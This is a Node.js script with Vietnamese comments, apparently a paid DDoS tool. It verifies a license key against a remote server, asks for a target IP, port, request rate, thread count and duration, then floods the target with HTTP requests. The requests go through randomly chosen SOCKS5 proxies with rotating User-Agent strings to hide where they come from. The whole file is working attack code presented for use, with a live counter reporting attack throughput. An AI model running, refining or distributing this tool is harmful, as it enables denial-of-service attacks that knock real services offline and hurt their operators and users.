const fs = require("fs");
const axios = require("axios");
const SocksProxyAgent = require("socks5-https-client/lib/Agent");
const readline = require("readline-sync");
const os = require("os");
const { Worker } = require("worker_threads");

// Đọc danh sách proxy SOCKS5 và User-Agent từ file
const proxies = fs.readFileSync("socks5.txt", "utf-8").split("\n").filter(Boolean);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split("\n").filter(Boolean);

// URL API xác thực key (Node.js Server)
const API_KEY_CHECK = "http://sgp2.hmvhostings.com:25676/checkkey/?key=";

// Kiểm tra key hợp lệ
async function checkKey() {
    const userKey = readline.question("🔑 Nhập key của bạn: ");
    try {
        const response = await axios.get(API_KEY_CHECK + encodeURIComponent(userKey));
        const data = response.data;

        if (data.status === "success") {
            console.log("✅ Key hợp lệ! Tiếp tục...");
            return true;
        } else {
            console.log("❌ Key không hợp lệ! Dừng chương trình.");
            process.exit(1);
        }
    } catch (error) {
        console.log("⚠ Lỗi kết nối đến server xác thực key!");
        process.exit(1);
    }
}

// Kiểm tra số luồng tối đa thiết bị có thể chạy bằng Worker Threads
async function testMaxThreads() {
    console.log("\n🔍 Đang kiểm tra số luồng tối đa có thể chạy...");

    return new Promise((resolve) => {
        const cpuThreads = os.cpus().length * 2; // Nhân đôi số CPU logic để tìm maxThreads
        let availableThreads = 0;
        let workers = [];

        function checkThread() {
            if (workers.length >= cpuThreads) {
                workers.forEach(worker => worker.terminate());
                console.log(`✅ Số luồng tối ưu phát hiện: ${availableThreads}`);
                return resolve(availableThreads);
            }

            const worker = new Worker(`
                const { parentPort } = require('worker_threads');
                setTimeout(() => parentPort.postMessage("done"), 100);
            `, { eval: true });

            worker.on('message', () => {
                availableThreads++;
                checkThread();
            });

            workers.push(worker);
        }

        checkThread();
    });
}

// Gửi yêu cầu HTTP qua proxy
async function sendRequest(proxy, userAgent, serverIp, serverPort) {
    const [host, port] = proxy.split(":");
    const agent = new SocksProxyAgent({ socksHost: host, socksPort: parseInt(port) });

    try {
        await axios.get(`http://${serverIp}:${serverPort}`, {
            httpAgent: agent,
            headers: { "User-Agent": userAgent },
            timeout: 5000,
        });
        return true;
    } catch (error) {
        return null;
    }
}

// Hàm chạy tấn công đa luồng với số request trong 0.1 giây
async function attackLoop(threadsCount, attackDuration, requestsPerBatch, serverIp, serverPort) {
    console.log("\n🚀 Bắt đầu tấn công...\n");
    const startTime = Date.now();
    let requestCount = 0;
    let dataSent = 0;

    while (Date.now() - startTime < attackDuration) {
        const tasks = [];

        for (let i = 0; i < threadsCount; i++) {
            for (let j = 0; j < requestsPerBatch; j++) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

                tasks.push(
                    sendRequest(proxy, userAgent, serverIp, serverPort).then((success) => {
                        if (success) {
                            requestCount++;
                            dataSent += 500;
                        }
                    })
                );
            }
        }

        await Promise.allSettled(tasks);

        const speedMbps = (dataSent * 8) / 1e6;
        console.clear();
        console.log(`🎯 Đang tấn công ${serverIp}:${serverPort}`);
        console.log(`🔹 Số threads đang chạy: ${threadsCount}`);
        console.log(`📡 Số request gửi đi: ${requestCount}`);
        console.log(`⚡ Tốc độ tấn công: ${speedMbps.toFixed(2)} Mbps`);
    }

    console.log("\n✅ Tấn công hoàn tất.");
}

// Chạy kiểm tra số luồng tối đa trước khi nhập thông tin
(async () => {
    await checkKey(); // Kiểm tra key trước khi chạy

    const maxThreads = await testMaxThreads();

    const serverIp = readline.question("\n🌐 Nhập IP server: ");
    const serverPort = readline.question("🔢 Nhập Port server: ");
    const requestsPerBatch = parseInt(readline.question("📈 Nhập số request trong 0.1 giây: "));
    let threadsCount = parseInt(readline.question(`⚙ Nhập số threads (tối đa ${maxThreads}, 0 để tự động tối ưu): `));
    if (threadsCount === 0) threadsCount = maxThreads;
    const attackDuration = parseInt(readline.question("⏳ Nhập thời gian tấn công (giây): ")) * 1000;

    attackLoop(threadsCount, attackDuration, requestsPerBatch, serverIp, serverPort);
})();
